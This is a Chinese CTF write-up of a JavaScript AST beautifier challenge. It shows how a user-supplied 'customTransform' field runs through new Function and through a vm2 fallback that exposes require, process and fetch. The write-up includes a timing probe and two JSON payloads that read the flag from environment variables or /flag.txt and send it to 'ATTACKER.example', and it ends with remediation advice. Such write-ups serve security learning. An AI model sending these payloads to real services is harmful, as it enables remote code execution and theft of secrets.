# The Metamorphic Mirror

## 题目简述

服务提供 JavaScript AST 美化接口，并允许用户提交 `customTransform`。只要启用高级变换，后端就先用宿主环境的 `new Function` 执行这段字符串；若执行报错，又会转入一个显式暴露 `require`、`process`、`global` 和 `fetch` 的 `vm2`。因此所谓“只读 AST”并没有形成代码执行边界，攻击者可以读取环境变量或 `/flag.txt`，再通过带外 HTTP 请求外传。

## 解题过程

### 沿 `customTransform` 的真实调用链检查

API 从 JSON 中取出 `code` 与 `options`：

```javascript
const { code, options = {} } = req.body;
const result = await beautifier.beautify(code, options);
```

`code` 必须是可被 Esprima 解析的 JavaScript，但攻击代码并不需要放在这里。设置 `options.enableAdvancedTransforms=true` 后，会进入：

```javascript
const transformFunction = new Function(
  'ctx',
  options.customTransform + '; return ctx.ast;'
);
transformFunction.call(transformContext, transformContext);
```

这不是 AST 变换 DSL，而是无过滤的任意 JavaScript 执行。`ctx.ast` 的只读 Proxy 只能阻止改写 AST，无法限制 `customTransform` 访问宿主全局对象。

如果宿主执行抛出异常，代码还会进入 VM fallback：

```javascript
this.vm = new VM({
  timeout: 5000,
  sandbox: {
    require: require,
    process: process,
    global: global,
    fetch: require('node-fetch')
  },
  eval: true
});
```

这同样不是“逃逸”：危险能力已经由应用主动注入沙箱。

### 先用时间差确认执行

提交一个合法的 `code`，并让变换阻塞约一秒：

```json
{
  "code": "function test() { return 'hello'; }",
  "options": {
    "enableAdvancedTransforms": true,
    "customTransform": "const t=Date.now(); while(Date.now()-t<1000){}"
  }
}
```

响应稳定增加约一秒即可证明字段被执行。这个探针只验证行为，不依赖服务端日志。

### 读取并带外发送 flag

Docker Compose 把 flag 放在 `process.env.FLAG`，Node 18 又提供全局 `fetch`。最短 payload 为：

```json
{
  "code": "let x = 1;",
  "options": {
    "enableAdvancedTransforms": true,
    "customTransform": "fetch('https://ATTACKER.example/collect?flag='+encodeURIComponent(process.env.FLAG))"
  }
}
```

若希望明确走 VM fallback，可让宿主 `new Function` 因找不到 CommonJS 局部变量 `require` 而失败；同一代码进入 VM 后，`require` 和 `fetch` 已在 sandbox 中暴露：

```json
{
  "code": "let x = 1;",
  "options": {
    "enableAdvancedTransforms": true,
    "customTransform": "const f=require('fs').readFileSync('/flag.txt','utf8').trim(); fetch('https://ATTACKER.example/collect?flag='+encodeURIComponent(f))"
  }
}
```

`/api/beautify` 的 JSON 响应故意不返回 VM 日志，直接 `return flag` 或 `console.log` 对客户端不可见，所以必须观察自己的接收端。收到：

```text
shellmates{4st_m4n1pul4t10n_1s_th3_k3y_t0_v1rtu4l_3sc4p3}
```

源码中的递归 merge 确实还允许嵌套 `__proto__` 操作，但它不是取得 flag 的必要条件；在已经存在直接任意代码执行时继续构造原型污染，只会增加失败面。

## 方法总结

分析“沙箱”题时要先确认代码究竟在哪里执行、沙箱拿到了哪些能力。这里第一条路径根本不在 VM 中，第二条路径又主动提供文件系统入口、进程对象和网络函数，因此 AST 只读代理、5 秒超时和 vm2 名称都不能提供安全隔离。最小修复是删除用户代码执行功能；若业务必须支持变换，应使用受限的声明式操作集合和独立进程隔离，而不是 `new Function` 或带危险宿主对象的 VM。
